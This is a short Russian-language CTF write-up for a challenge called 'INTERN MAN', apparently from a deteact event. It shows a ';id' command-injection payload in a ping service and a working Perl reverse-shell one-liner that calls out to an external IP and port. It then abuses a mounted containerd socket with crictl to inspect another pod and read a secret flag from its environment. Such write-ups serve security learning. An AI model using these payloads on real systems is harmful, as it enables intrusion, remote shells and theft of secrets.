# INTERN MAN
Заходим на http://91.105.199.185:20198/, видим сервис который делает пинг по указанному адресу. Пробуем выполнить произвольные команды:
`;id`.
В ответ получаем вывод команды id.

Получаем реверс шелл в контейнер:
```
;perl -e 'use Socket;$i="31.41.99.36";$p=4221;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Выполняем `mount` и видим:
`tmpfs on /run/containerd/containerd.sock`

Скачиваем crictl:
```
mkdir /tmp/.taxidriver
cd /tmp/.taxidriver
wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.26.1/crictl-v1.26.1-linux-amd64.tar.gz
tar zxf crictl-v1.26.1-linux-amd64.tar.gz
rm crictl-v1.26.1-linux-amd64.tar.gz
```

Смотрим список запущенных контейнеров:
`./crictl -r /run/containerd/containerd.sock ps`

Видим интересный test-pod:
`8397cd2b32802 a6838e9a6ff6a 4 days ago Running test1 0 83554ccdc7eea test-pod`

Выводим статус контейнера:
`./crictl -r /run/containerd/containerd.sock inspect 8397cd2b32802`

В "env" видим флаг:
`"intern_secret=deteact{c424c8ff2c020392c3ca26ab689a36a4}"`

Флаг - deteact{c424c8ff2c020392c3ca26ab689a36a4}